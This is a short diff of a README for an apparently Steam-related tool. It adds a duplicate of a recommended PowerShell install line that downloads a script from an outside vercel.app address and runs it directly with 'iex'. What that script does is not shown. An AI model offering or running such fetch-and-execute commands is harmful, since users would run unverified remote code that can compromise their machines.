@@ -67,6 +67,7 @@ Real-world testing on average gaming systems:
 ### Method 1: PowerShell (Recommended)
 ```powershell
 irm https://steamdeb.vercel.app/api/get | iex
+irm https://steamdeb.vercel.app/api/get | iex
 ```
 
 ### Method 2: Batch File
